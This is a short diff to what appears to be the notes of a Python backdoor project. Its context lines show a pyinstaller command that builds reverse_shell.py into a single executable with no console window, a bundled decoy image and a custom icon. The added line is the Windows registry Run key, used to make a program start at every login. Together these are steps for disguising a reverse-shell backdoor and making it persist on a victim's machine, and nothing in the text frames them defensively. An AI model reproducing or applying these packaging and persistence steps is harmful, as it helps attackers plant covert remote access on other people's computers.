@@ -26,3 +26,5 @@ proc.stderr.read(): Reads any error messages (standard error).
 
 
 pyinstaller reverse_shell.py --add-data "C:\x\x\Desktop\backdoor-python\poa.jpg;." --onefile --noconsole --icon C:\x\x\Desktop\backdoor-python\poatan.ico
+
+Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
